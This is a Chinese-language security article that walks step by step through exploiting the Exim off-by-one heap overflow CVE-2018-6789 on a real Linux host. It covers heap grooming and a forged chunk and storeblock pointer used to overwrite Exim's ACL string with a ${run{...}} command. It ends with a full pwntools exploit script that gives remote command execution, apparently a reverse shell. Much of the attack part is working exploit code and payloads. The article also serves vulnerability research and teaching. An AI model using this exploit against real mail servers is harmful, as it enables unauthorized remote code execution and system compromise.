# Exim off-by-one漏洞真实环境的利用分析

阅读量 **250917**

|评论 **9**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-04-26 14:00:21

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01b4e205d3ba0668d0.jpg)

## 1 前言

Exim是基于Linux平台的开源邮件服务器，在2018年2月爆出了堆溢出漏洞（CVE-2018-6789），影响4.91之前的所有版本。该漏洞由研究员Meh发现，并在blog中提供了利用漏洞实现远程代码执行的思路。目前Meh并没有公开漏洞利用代码，但根据其漏洞利用思路，有研究员在docker中搭建漏洞环境，并结合爆破的思路成功实现远程命令执行，并且公布了利用代码，但docker毕竟不是真实环境。虽然也有研究员在Ubuntu的真实环境中对漏洞进行了复现，但细节部分并未解释透彻（可能是我能力水平不够），也没有公布利用代码。  
因此，我根据docker环境中的利用脚本，在真实环境中进行了漏洞复现，初次尝试Linux软件漏洞调试，踩了不少坑。下面我将自己的复现过程介绍一下，如有错误，敬请指正。

## 2 环境搭建

###  系统环境

Linux kali 4.14.0-kali3-amd64 #1 SMP Debian 4.14.17-1kali1 (2018-02-16) x86_64
GNU/Linux

###  编译环境

ldd (Debian GLIBC 2.27-2) 2.27

###  exim安装

> apt-get -y update && \  
>  DEBIAN_FRONTEND=noninteractive apt-get install -y \  
>  wget \  
>  xz-utils \  
>  make \  
>  gcc \  
>  libpcre++-dev \  
>  libdb-dev \  
>  libxt-dev \  
>  libxaw7-dev \  
>  tzdata \  
>  telnet && \  
>  rm -rf /var/lib/apt/lists/*  
>  wget
> https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz &&
> \  
>  tar xf exim-4.89.tar.xz && cd exim-4.89 && \  
>  cp src/EDITME Local/Makefile && cp exim_monitor/EDITME Local/eximon.conf &&
> \  
>  sed -i ‘s/# AUTH_CRAM_MD5=yes/AUTH_CRAM_MD5=yes/’ Local/Makefile && \  
>  sed -i ‘s/^EXIM_USER=/EXIM_USER=exim/’ Local/Makefile && \  
>  useradd exim && make && mkdir -p /var/spool/exim/log && \  
>  cd /var/spool/exim/log && touch mainlog paniclog rejectlog && \  
>  chown exim mainlog paniclog rejectlog && \  
>  echo “Asia/Shanghai” > /etc/timezone && \  
>  cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime

###  配置文件内容

> acl_smtp_mail=acl_check_mail  
>  acl_smtp_data=acl_check_data  
>  begin acl  
>  acl_check_mail:  
>  .ifdef CHECK_MAIL_HELO_ISSUED  
>  deny  
>  message = no HELO given before MAIL command  
>  condition = ${if def:sender_helo_name {no}{yes}}  
>  .endif  
>  accept  
>  acl_check_data:  
>  accept  
>  begin authenticators  
>  fixed_cram:  
>  driver = cram_md5  
>  public_name = CRAM-MD5  
>  server_secret = ${if eq{$auth1}{ph10}{secret}fail}  
>  server_set_id = $auth1

###  exim启动命令

./exim –bd –d-receive –C conf.conf  

## 3 漏洞原理

![](https://p2.ssl.qhimg.com/t01420e63889df54d46.png)

Exim分配3*(len/4)+1字节空间存储base64解码后的数据。如果解码前数据有4n+3个字节，exim会分配3n+1字节空间，但实际解码后的数据有3n+2字节，导致在堆上溢出一个字节，属于经典的off-by-one漏洞。

## 4 exim内存管理

###  4.1 chunk结构

glibc在chunk开头使用0x10字节（x86-64）存储相关信息，包含前一个chunk的大小、当前chunk大小和标志位（相关基础知识自行查看Linux堆管理内容）。Size的前三位表示标志位，最后一位表示前一个chunk是否被使用。如下图0x81表示当前chunk大小是0x80字节，且前一个chunk正在被使用。  

###  4.2 storeblock结构

exim在libc提供的堆管理机制的基础上实现了一套自己的管理堆块的方法，引入了storepool、storeblock的概念。store
pool是一个单链表结构，每一个节点都是一个storeblock，每个store
block的数据大小至少为0x2000。storeblock的结构包含在chunk中，在chunk的基础上多包含一个指向下一个storeblock的next指针和当前storeblock的大小，如下图所示。  

###  4.3 storeblock的管理

下图展示了一个storepool的完整的数据存储方式，chainbase是头结点，指向第一个storeblock，current_block是尾节点，指向链表中的最后一个节点。store_last_get指向current_block中最后分配的空间，next_yield指向下一次要分配空间时的起始位置，yield_length则表示当前store_block中剩余的可分配字节数。当current_block中的剩余字节数（yield_length）小于请求分配的字节数时，会调用malloc分配一个新的storeblock块，然后从该storeblock中分配需要的空间。  

###  4.4 堆分配函数及规则

在exim中使用的大部分已释放的chunk会被放入unsorted
bin双向链表（相关基础知识自行查看Linux堆管理内容）。glibc根据标识进行维护，维护中会将相邻且已释放的chunk合并成一个更大的chunk，避免碎片化。对于每个内存分配请求，glibc都会按照FIFO的顺序检查unsorted
bin里的chunk并重新使用。exim采用store_get()、store_release()、store_extend()和store_reset()维护自己的链表结构。  
（1）EHLO
hostname：exim调用store_free()函数释放旧的hostname，调用store_malloc()函数存储新的hostname。  
（2）unrecongnized command：exim调用store_get()函数分配一段内存将不可打印字符转换为可打印字符。  
（3）AUTH：在多数身份验证中，exim采用base64编码与客户端通信，编码和解码的字符串存在store_get()函数分配的缓冲区。  
（4）EHLO/HELO、MAIL、RCPT中的reset功能：当命令正确完成时，exim调用smtp_reset()，释放上一个命令之后所有由store_get()分配的storeblock。

## 5 漏洞复现

###  5.1 发送ehlo布局堆空间

    
    
    ehlo(s, "a"*0x1000)
    ehlo(s, "a"*0x20)
    

形成一个0x7040字节大小的unsorted bin。  
  
此时的堆布局如下图所示。  

###  5.2 发送unrecongnized command

    
    
    docmd(s, "xee"*0x700)
    

从unsorted bin分配新的storeblock。发送的unrecongnized command的大小满足`length +
nonprintcount*3 + 1 > yield_length`，store_get函数就能调用malloc函数分配一个新的storeblock。  

  
此时的堆布局如下图所示。  

###  5.3 发送ehlo回收unrecongnized command分配的内存

    
    
    ehlo(s, "c"*(0x2c00))
    

ehlo 0x2c00字节，回收unrecongnized
command分配的内存，空出0x2020个字节。在docker环境的调试中，有研究人员提到，由于之前的`ehlo(s,
"a"*0x20)`占用的0x30字节的内存释放，会空出0x30+0x2020=0x2050字节空间内存，但我的真实环境却不是这样。  
  
如上图所示，之前`ehlo(s, "a"*0x20)`占用的0x30字节内存并未释放，只空出0x2020字节空间。此时的堆布局如下图所示。  

###  5.4 发送auth，触发off-by-one漏洞，修改chunk大小

    
    
    docmd(s, "AUTH CRAM-MD5")
    payload1 = "d"*(0x2020-0x18-1)
    docmd(s, b64encode(payload1)+"EfE")
    

`payload1 =
"d"*(0x2020-0x18-1)`这句代码跟docker环境中的代码不一样，少加了一个0x30，上一步中已经说明实际环境中`ehlo(s,
"a"*0x20)`占用的0x30字节内存并未释放。  

  
此时的堆布局如下图所示。  
  
从0x2c10被溢出为0x2cf1，下一个chunk应该从0x5656564ea050 + 0x2cf0 =
0x5656564ecd40开始，现在这里并没有chunk信息，下一步需要在这里伪造chunk信息。

###  5.5 发送auth，伪造chunk信息

    
    
    docmd(s, "AUTH CRAM-MD5")
    payload2 = p64(0x1f41)+'m'*0x70 # modify fake size
    docmd(s, b64encode(payload2))
    

伪造chunk头。  

  
此时的堆布局如下图所示。  

###  5.6 释放被改掉大小的chunk

    
    
    ehlo(s, "a+")
    

为了不释放其他的storeblock，发送包含无效字符的信息。  
  
此时的堆布局如下图所示。  

###  5.7 发送auth数据，修改storeblock的next指针，指向acl字符串所在的chunk

    
    
    docmd(s, "AUTH CRAM-MD5")
    acl_chunk = p64(0x5653564c1000+0x66f0)  #acl_chunkr = &heap_base + 0x66f0
    payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + acl_chunk
    docmd(s, b64encode(payload3)) # fake chunk header and storeblock next
    

0x5653564c1000是exim运行时堆的基地址。  
  
exim有一组全局指针指向ACL字符串。指针在exim启动时初始化，根据配置文件进行设置。配置文件中包含acl_smtp_mail=acl_check_mail，因此指针acl_smtp_mail始终指向acl_check_mail，只要碰到MAIL
FROM，exim就会执行acl检查。因此只要覆盖acl字符串为`${run{command}}`，exim便会调用execv执行command命令，实现远程命令执行，而且还能绕过PIE、NX等限制。通过`x
/18xg
&acl_smtp_mail`可以得到acl_check_mail字符串的地址，从而可以找到acl_check_mail所在chunk的地址（本例中为0x5653564c7778），我经过调试和计算，acl_check_mail字符串所在堆的地址也可以通过堆基地址加上0x66f0的偏移得到。  
  
修改storeblock的next指针，指向acl字符串所在的chunk，本例中就是0x5653564c76f0。  
  
此时的堆布局如下图所示。  

###  5.8 释放storeblock，包含acl的storeblock被回收到unsorted bin中

    
    
    ehlo(s, 'crashed')
    

  
此时，unsorted
bin中有两个大小为0x2020的chunk（0x5653564e8040、0x5653564ecc70），下一步就是先占用这两个0x2020字节大小的unsorted
bin，然后覆盖0x5653564c76f0这个chunk。

###  5.9 发送auth数据，覆盖acl_check_mail字符串

    
    
    payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
    payload4 += 't'*(0x1f80-len(payload4))
    auth(s, b64encode(payload4)+'ee')
    

占用第一个0x2020字节大小的chunk：0x5653564e8040。解释一下，这里也是用伪造chunk的方法，首先伪造一个0xb0大小的chunk，然后伪造一个0x1f40大小的chunk，这样来达到占用0x2020大小chunk的目的。  

    
    
    payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
    payload4 += 't'*(0x1f80-len(payload4))
    auth(s, b64encode(payload4)+'AA')
    

占用第二个0x2020字节大小的chunk：0x5653564ecc70。  
  
此时的堆布局就可以开始覆盖地址为0x5653564c76f0的chunk了。

    
    
    payload5 = "a"*0x78 + "${run{" + command + "}}x00"
    auth(s, b64encode(payload5)+"AA")
    

  
这里需要提一下就是，command命令长度是有限制的，否则会覆盖后面的日志文件路径字符串，导致exim进入其他错误处理流程而不调用execv函数执行command命令。

###  5.10 触发acl检查

    
    
    s.sendline("MAIL FROM: <test@163.com>")
    

触发acl检查，执行/bin/bash命令，反弹shell，效果如下图所示。  

  
这里需要说明的是反弹的shell不是root权限，而是用户exim权限。

## 6 总结与思考

该漏洞利用条件是比较苛刻的，exim的配置必须开启CRAM-MD5认证，其次exim的启动参数不同会造成堆布局不同，还有必须获取exim运行时堆的地址，才能准确覆盖acl字符串，docker环境中可以选择爆破，但真实环境中在不知道exim程序基地址的情况下采用爆破显然不大可取。如果大家有什么好的思路可以获取exim的堆地址，可以交流一下。

## 7 参考

<http://www.freebuf.com/vuls/166519.html>  
<https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789>  
<https://bbs.pediy.com/thread-225986.htm>  
<https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/>  
<https://paper.seebug.org/557/>

## 附EXP

    
    
    #!/usr/bin/python
    # -*- coding: utf-8 -*-    from pwn import *
    import time
    from base64 import b64encode
    def ehlo(tube, who):
        time.sleep(0.2)
        try:
           tube.sendline("ehlo "+who)
           tube.recvline()
        except:
           print("Error sending ehlo data")
    
    def docmd(tube, command):
        time.sleep(0.2)
        try:
           tube.sendline(command)
           tube.recvline()
        except:
           print("Error sending docmd data")
    
    def auth(tube, command):
        time.sleep(0.2)
        try:
           tube.sendline("AUTH CRAM-MD5")
           tube.recvline()
           time.sleep(0.2)
           tube.sendline(command)
           tube.recvline()
        except:
           print("Error sending auth data")
    
    def execute_command(acl_chunk, command):
        context.log_level='warning'
        s = remote(ip, 25)
        # 1. put a huge chunk into unsorted bin 
        print("[+]1.send ehlo, make unsorted binn")
        ehlo(s, "a"*0x1000) # 0x2020
        ehlo(s, "a"*0x20)
        raw_input("make unsorted bin: 0x7040n")
    
        # 2. cut the first storeblock by unknown command
        print("[+]2.send unknown commandn")
        docmd(s, "xee"*0x700)
        raw_input("""docmd(s, "xee"*0x700)n""")
    
        # 3. cut the second storeblock and release the first one
        print("[+]3.send ehlo again to cut storeblockn")
        ehlo(s, "c"*(0x2c00))
        raw_input("""ehlo(s, "c"*(0x2c00))n""")
    
        # 4. send base64 data and trigger off-by-one
        print("[+]4.overwrite one byte of next chunkn")
        docmd(s, "AUTH CRAM-MD5")
        payload1 = "d"*(0x2020-0x18-1)
        docmd(s, b64encode(payload1)+"EfE")
        raw_input("after payload1n")
    
        # 5. forge chunk size
        print("[+]5.forge chunk sizen")
        docmd(s, "AUTH CRAM-MD5")
        payload2 = p64(0x1f41)+'m'*0x70 # modify fake size
        docmd(s, b64encode(payload2))
        raw_input("modified fake sizen")
    
        # 6. relase extended chunk
        print("[+]6.resend ehlo, elase extended chunkn")
        ehlo(s, "a+")
        raw_input("ehlo(s, 'a+')")
    
        # 7. overwrite next pointer of overlapped storeblock
        print("[+]7.overwrite next pointer of overlapped storeblockn")
        docmd(s, "AUTH CRAM-MD5")
        raw_input("docmd(s, 'AUTH CRAM-MD5')n")
        acl_chunk = p64(0x5653564c1000+0x66f0)  #acl_chunk = &heap_base + 0x66f0
        payload3 = 'a'*0x2bf0 + p64(0) + p64(0x2021) + acl_chunk
        try:
            docmd(s, b64encode(payload3)) # fake chunk header and storeblock next
            raw_input("after payload3")
    
            # 8. reset storeblocks and retrive the ACL storeblock
            print("[+]8.reset storeblockn")
            #ehlo(s, 'crashed') released
            ehlo(s, 'crashed')
            raw_input("ehlo(s, 'crashed')")
    
            # 9. overwrite acl strings
            print("[+]9.overwrite acl stringsn")
            #Occupy the first 0x2020 chunk
            payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
            payload4 += 't'*(0x1f80-len(payload4))
            auth(s, b64encode(payload4)+'ee')
            #Occupy the second 0x2020 chunk
            payload4 = 'a'*0x18 + p64(0xb1) + 't'*(0xb0-0x10) + p64(0xb0) + p64(0x1f40)
            payload4 += 't'*(0x1f80-len(payload4))
            auth(s, b64encode(payload4)+'AA')
            raw_input("after payload4")
            #overwrite acl strings with shell payload
            payload5 = "a"*0x78 + "${run{" + command + "}}x00"
            auth(s, b64encode(payload5)+"AA")
            raw_input("after payload5")
    
            # 10. trigger acl check
            print("[+]10.trigger acl check and execute commandn")
            time.sleep(0.2)
            s.sendline("MAIL FROM: <test@163.com>")
            s.close()
            return 1
        except Exception, e:
            print('Error:%s'%e)
            s.close()
            return 0
    if __name__ == "__main__":
       if len(sys.argv) > 0:
          ip = '127.0.0.1'
          acl_chunk = 0x0
          execute_command(acl_chunk, command)
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **sec蜗牛** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/106490](/post/id/106490)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞](/tag/漏洞)
  * [Exim](/tag/Exim)
  * [RCE](/tag/RCE)
  * [CVE-2018-6789](/tag/CVE-2018-6789)
  * [off-by-one](/tag/off-by-one)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhimg.com/t01caf13186db582315.png) sec蜗牛

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

